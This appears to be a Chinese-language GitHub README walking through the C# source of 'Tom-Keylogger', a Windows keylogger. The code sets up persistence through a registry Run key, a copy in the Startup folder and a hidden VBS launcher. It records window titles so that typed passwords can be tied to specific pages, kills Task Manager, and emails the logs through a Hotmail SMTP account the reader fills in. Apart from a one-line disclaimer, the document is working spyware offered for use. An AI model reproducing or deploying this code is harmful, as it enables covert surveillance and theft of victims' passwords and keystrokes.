# Tom-Keylogger
![Image](https://github.com/tomridder/kl2/blob/master/trojan.jpg)

### 前言
> 本keylogger是在 [Email-keylogger](https://www.go4expert.com/forums/keylogger-email-usb-spread-written-c-t23227/)基础上进行的二次开发。

新增加的功能有
- win10,win7系统下实现开机自启动
- 实时记录当前用户开启的程序和窗口文字

若有什么不足之处，还请提出建议，附上这个 APP 的 Github 地址 [Tom-Keylogger](https://github.com/tomridder/kl2) 欢迎大家  :heart: star 和 fork.

#### 本文的主要内容
- 窗口句柄记录，按键记录,email效果演示
- win10,win7系统下实现开机自启动实现
- 实时记录当前用户开启的程序和窗口文字
- 如何成功实现发送txt文件到邮箱
#### 1.窗口句柄记录，按键记录 效果演示：

![Image](https://github.com/tomridder/kl2/blob/master/screenshot.png)

#### 2.email记录效果演示

![Image](https://github.com/tomridder/kl2/blob/master/email.png)

#### 2. win10,win7系统下实现开机启动实现：

**(1)win7下实现开机启动**
```
        public static void Start()
        {
            //    MessageBox.Show("设置开机自启动，需要修改注册表", "提示");
        
            string path = Application.ExecutablePath;
            RegistryKey rk = Registry.LocalMachine;//读取 Windows 注册表基项 HKEY_LOCAL_MACHINE
            RegistryKey rk2 = rk.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run");
            rk2.SetValue("JcShutdown", path);// exe 加入开机启动：）
            rk2.Close();
            //MessageBox.Show("Added To Started Up Successfully :) ");
        }
```
- 代码很简单，只是将启动的项目名称、文件位置添加到启动项即可，在win7下成功实现。win10下打开任务管理器中的启动项目可以发现该程序，但是开机后程序并没有
运行，这就牵扯到了第二种方法。

**(2)win10下实现开机启动**
```
        public static void startup()
        {
            //Try to copy keylogger in some folders
            string source = Application.ExecutablePath.ToString();//当前可执行文件的路径
            Console.WriteLine(source);
            string destination = Environment.GetFolderPath(Environment.SpecialFolder.Startup);//开机启动区 路径
            Console.WriteLine(destination);
            destination = System.IO.Path.Combine(destination, "kl2.exe");// 将两个路径合二为一
            try
            {
                System.IO.File.Copy(source, destination, true);// 把当前文件 复制到 开机启动区去
                source = destination;
            }
            catch
            {
                Console.WriteLine("No authorization to copy file or other error.");
            }
            
        }
```

- 首先我写了一个startup()函数用于将当前的exe文件拷贝到StartUP文件夹

```
        public static void CopyVbs()
        {
            
            string destination1 = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            string destination = System.IO.Path.Combine(destination1, "AutoStart.vbs");
            if (!System.IO.File.Exists(destination))
            {
                StreamWriter sw = new StreamWriter(destination);
                sw.WriteLine("Set shell =Wscript.createobject(\"WScript.Shell\")  ");
                sw.WriteLine("shell.Run \"kl2.exe\",0,False");
                sw.Close();
                File.SetAttributes(destination, File.GetAttributes(destination) | FileAttributes.Hidden);
            }
        }
```
- 接着我写了一个函数，用于在StartUp文件夹下新建一个vbs文件，然后用StreamWriter 使得该vbs的内容为运行kl.exe

- 这样，当开机时，系统会自动运行脚本，脚本的内容为运行kl.exe。（仅仅将kl.exe拷贝到StartUp文件夹是无法开机自启动的，本人亲自试过）

#### 3.实时记录当前用户开启的程序和窗口文字的实现：
``` 
public static void GetActiveWindowTitle(object source, EventArgs e)
        {
            const int nChars = 256;     
            handle = GetForegroundWindow();
            StringBuilder Buff = new StringBuilder(nChars);
            GetWindowText(handle, Buff, nChars);          
            txt = Buff.ToString().ToCharArray();
            string t = DateTime.Now.ToString("yyyy-MM-dd H:mm:ss");
            if (!IsFileInUse(path))
            {
               // if (handle != handle1)
                if(!CheckChar(txt1,txt))
                {
                    StreamWriter ww = File.AppendText(Program.path);
                    ww.Write("\n");
                    ww.Write(t);
                    ww.Write(" ");
                    ww.WriteLine(Buff.ToString().ToCharArray());
                    ww.Close();
                   // handle1 = handle;
                    GiveChar(txt1,txt);
                }
            }
        }
``` 
算法大概是这样的

1.用GetForegroundWindow函数 得到当前运行在 最前排的程序的句柄handle

2.通过GetWindowText函数将handle转换为StringBuilder

3.然后将StringBuilder转换为CharArray

4.接着我写了一个CheckChar函数，用于防止句柄重复写入。代码如下

``` 
 public static bool CheckChar(char[] a, char[] b)
{
    int m = Math.Min(a.Length, b.Length);
	for (int i = 0; i < m; i++)
	{
		if (a[i] != b[i])
		{
			return false;
		}
	}
	return true;
}
```  
5.最后则是将CharArray写入文件，将CharArray赋值，用于下次对比。

（网上的其他方法是直接对比handle来防止重复写入，这种方法是不可取的。如：当在Google Chrome中切换标签时，句柄并未发生变化，CharArray发生了变化
，这时程序就无法正确监控用户是在哪个网页输入了密码。这算是我在做这个功能时遇到的一个很大的坑吧~~）

#### 4.如何成功实现发送txt文件到邮箱

C#作为高级语言真的很方便实现网络编程，直接用微软封装好的 System.Net.Mail 就足够了

代码如下
```
        public static void OnTimedEvent(object source, EventArgs e)
        {

            Process[] ProcessList = Process.GetProcesses();//为每个进程资源 创建组件
            foreach (Process proc in ProcessList)
            {
                if (proc.MainWindowTitle.Contains("Taskmgr.exe"))
                {
                    proc.Kill();//关闭任务管理器
                }
            }
            //发送邮件
            System.Net.Mail.MailMessage msg = new System.Net.Mail.MailMessage(); //create the message
            msg.To.Add("**************");
            msg.From = new MailAddress("***********", "********", System.Text.Encoding.UTF8);
            string _ComputName = System.Net.Dns.GetHostName();
            msg.Subject = _ComputName;
            msg.SubjectEncoding = System.Text.Encoding.UTF8;
            msg.Body = "L";
            msg.BodyEncoding = System.Text.Encoding.UTF8;
            msg.IsBodyHtml = false;
            msg.Priority = MailPriority.High;//邮件优先级 最高
            SmtpClient client = new SmtpClient(); //Network Credentials for Gmail
            client.Credentials = new System.Net.NetworkCredential("**********@hotmail.com", "************");
            client.Port = 587;
            client.Host = "smtp.office365.com";
            client.EnableSsl = true;
            Attachment data = new Attachment(Program.path);
            msg.Attachments.Add(data);//添加 附件
            try
            {
                client.Send(msg);
                failed = 0;
            }
            catch
            {
                data.Dispose();//释放掉 资源 
                failed = 1;
            }
            data.Dispose();

            //if (failed == 0)
              //  File.WriteAllText(Program.path, ""); //如果发送成功 则 将txt清空  防止发送相同数据

            failed = 0;
        }
```

- 你只需要将代码中的******  替换为自己的账号密码即可
- 需要注意的是，源程序中采用的smtp协议是gmail，本人亲测后发现由于网络原因无法实现按周期发送。
- 多次尝试后，发现只有hotmail可以满足成功实现。但是发件箱和收件箱必须同时开启smtp和pop3协议。


### 结语
> 
以上便是我写这个 APP 的具体实现思路，以及踩过的一些坑，记录下来，给大家看看。

#### This tutorial is for educational purposes only, please do not use this for malicious purposes. 

最后附上这个 APP 的 Github 地址  [Tom-Keylogger](https://github.com/tomridder/kl2) 欢迎大家 :heart: star 和 fork。

如果有什么想法或者建议，非常欢迎大家来讨论。
 
-----
